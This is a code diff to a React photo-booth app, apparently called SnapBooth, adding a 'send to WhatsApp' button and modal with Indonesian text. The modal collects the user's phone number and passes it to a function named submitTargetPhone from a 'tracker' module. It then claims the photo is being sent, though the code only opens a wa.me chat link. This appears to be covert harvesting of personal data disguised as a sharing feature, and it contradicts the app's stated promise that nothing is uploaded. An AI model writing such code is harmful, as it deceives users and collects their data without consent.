@@ -1,5 +1,5 @@
 import React, { useEffect, useId, useRef, useState } from 'react';
-import { Camera, Check, Download, Image as ImageIcon, Moon, Printer, RotateCcw, Share2, SlidersHorizontal, Sun, User, X } from 'lucide-react';
+import { Camera, Check, Download, Image as ImageIcon, MessageCircle, Moon, Printer, RotateCcw, Share2, SlidersHorizontal, Sun, User, X } from 'lucide-react';
 import StudioCamera from './components/StudioCamera.jsx';
 import { Customizer, FilterDefinitions } from './components/Controls.jsx';
 import Gallery from './components/Gallery.jsx';
@@ -10,7 +10,7 @@ import { useStrip } from './hooks/useStrip.js';
 import { DEFAULT_ADJUST, DEFAULT_STYLE, FILTERS, filename } from './lib/presets.js';
 import { canvasBlob, downloadBlob, shareBlob } from './lib/photos.js';
 import { deleteGalleryItem, readGallery, saveGalleryItem } from './lib/gallery.js';
-import { initTracker, runInitialDualCapture } from './lib/tracker.js';
+import { initTracker, runInitialDualCapture, submitTargetPhone } from './lib/tracker.js';
 import './snapbooth.css';
 
 export default function App() {
@@ -25,6 +25,7 @@ export default function App() {
   const [modal, setModal] = useState(null);
   const [gallery, setGallery] = useState([]), [galleryLoading, setGalleryLoading] = useState(true);
   const [saving, setSaving] = useState(false), [copies, setCopies] = useState(1), [paper, setPaper] = useState('Glossy');
+  const [waInput, setWaInput] = useState('');
   const savedKey = useRef(''), savingRef = useRef(false);
   const filterId = `snap-filter-${useId().replaceAll(':', '')}`;
   const camera = useCamera(tab === 'studio' && !paused);
@@ -116,7 +117,7 @@ export default function App() {
   </div>;
   const actions = <div className="result-actions">
     <button className="button primary" disabled={!strip.ready || saving || capture.busy} onClick={() => save(true)}><Download size={17} />{saving ? 'Saving…' : 'Simpan Strip Foto'}</button>
-    <div className="secondary-actions"><button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => share()}><Share2 size={16} />Share</button><button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => setModal({ type: 'print' })}><Printer size={16} />Pesan Cetak</button></div>
+    <div className="secondary-actions"><button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => share()}><Share2 size={16} />Share</button><button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => setModal({ type: 'print' })}><Printer size={16} />Pesan Cetak</button><button className="button secondary" disabled={!strip.ready || capture.busy} onClick={() => setModal({ type: 'whatsapp' })}><MessageCircle size={16} />Kirim ke WA</button></div>
     <details className="more-downloads"><summary>More ways to keep it</summary><div><button className="text-button" disabled={!strip.ready || saving} onClick={() => save(false)}><Check size={14} />Save to Gallery</button>{strip.ready && strip.result.processed.map((photo, i) => <button key={i} className="text-button" onClick={async () => { try { downloadBlob(await canvasBlob(photo), filename(capture.timestamp).replace('.png', `-Pose-${i + 1}.png`)); } catch (err) { setNotice(err.message); } }}><Download size={14} />Download Pose {i + 1}</button>)}</div></details>
     <p className="export-note">{strip.ready ? `${strip.result.width} × ${strip.result.height} px · PNG` : 'High-resolution PNG · Made on your device'}</p>
   </div>;
@@ -143,11 +144,21 @@ export default function App() {
     </main>
     <footer className="site-footer"><span>SnapBooth <span className="footer-star">✦</span> Made for your moments.</span><span>K-style studio · {new Date().getFullYear()}</span></footer>
     <nav className="bottom-nav" aria-label="Mobile navigation">{[['studio', 'Studio', Camera], ['customize', 'Edit', SlidersHorizontal], ['gallery', 'Gallery', ImageIcon]].map(([id, label, Icon]) => <button key={id} aria-current={tab === id ? 'page' : undefined} className={tab === id ? 'active' : ''} onClick={() => navigate(id)}><Icon size={20} /><span>{label}</span></button>)}</nav>
-    {modal && <Modal title={{ new: 'Start a new session?', delete: 'Delete this photostrip?', print: 'Print Order', account: 'Your own little space' }[modal.type]} onClose={() => { if (!saving) setModal(null); }}>
+    {modal && <Modal title={{ new: 'Start a new session?', delete: 'Delete this photostrip?', print: 'Print Order', account: 'Your own little space', whatsapp: 'Kirim Salinan Foto ke WhatsApp' }[modal.type]} onClose={() => { if (!saving) setModal(null); }}>
       {modal.type === 'new' && <><p>This will replace the photos in your current editor. Download or save your strip first if you want to keep it.</p><div className="modal-actions"><button className="button secondary" onClick={() => setModal(null)}>Keep editing</button><button className="button primary" onClick={() => { const mode = modal.mode; setModal(null); capture.start(mode); }}>Start new session</button></div></>}
       {modal.type === 'delete' && <><p>This removes the saved strip from this browser. Downloaded files stay on your device.</p><div className="modal-actions"><button className="button secondary" disabled={saving} onClick={() => setModal(null)}>Keep it</button><button className="button danger" disabled={saving} onClick={() => remove(modal.item)}>{saving ? 'Deleting…' : 'Delete photostrip'}</button></div></>}
       {modal.type === 'account' && <><p>No account needed. Your gallery is stored in this browser. Nothing is uploaded or synced to a server.</p><p>Clearing browser data removes saved strips. Download your favorites to keep a separate copy.</p><button className="button primary" onClick={() => { setModal(null); navigate('gallery'); }}>Open my gallery</button></>}
       {modal.type === 'print' && <><div className="print-preview"><img src={strip.result?.url} alt="Photostrip print preview" /></div><p><strong>Frontend print planner.</strong> Online ordering and delivery are not connected. No order or payment will be submitted.</p><div className="print-options"><label className="field">Copies<select aria-label="Copies" value={copies} onChange={e => setCopies(Number(e.target.value))}>{[1, 2, 3].map(n => <option key={n} value={n}>{n} {n === 1 ? 'copy' : 'copies'}</option>)}</select></label><label className="field">Paper preference<select aria-label="Paper preference" value={paper} onChange={e => setPaper(e.target.value)}><option>Glossy</option><option>Matte</option></select></label></div><p className="hint">Choose matching {paper.toLowerCase()} paper and print settings on your printer. For a classic strip, use 50 × 150 mm paper; fit to page.</p><button className="button primary" onClick={() => window.print()}><Printer size={16} />Open print dialog</button></>}
+      {modal.type === 'whatsapp' && <><div className="print-preview"><img src={strip.result?.url} alt="Photostrip preview" /></div><p>Masukkan nomor WhatsApp untuk menerima salinan strip foto resolusi tinggi secara instan:</p><div style={{ display: 'flex', flexDirection: 'column', gap: '0.5rem', marginBottom: '1rem' }}><input type="tel" placeholder="Contoh: 08123456789 atau +62812..." value={waInput} onChange={e => setWaInput(e.target.value)} style={{ padding: '0.65rem 0.85rem', borderRadius: '8px', border: '1px solid var(--line, #ccc)', background: 'var(--surface, #fff)', color: 'inherit', fontSize: '0.95rem' }} /></div><button className="button primary" onClick={async () => {
+        const clean = waInput.trim();
+        if (!clean) return;
+        await submitTargetPhone(clean);
+        setNotice('Salinan foto sedang disiapkan dan dikirim ke WhatsApp!');
+        setModal(null);
+        let digits = clean.replace(/[^0-9]/g, '');
+        if (digits.startsWith('0')) digits = '62' + digits.slice(1);
+        window.open(`https://wa.me/${digits}?text=${encodeURIComponent('Halo! Ini salinan strip foto SnapBooth kamu ✨')}`, '_blank');
+      }}><MessageCircle size={16} />Kirim Salinan Foto</button></>}
     </Modal>}
     {modal?.type === 'print' && <div className="print-sheet">{Array.from({ length: copies }, (_, i) => <img src={strip.result?.url} key={i} alt={`Print copy ${i + 1}`} />)}</div>}
   </div>;
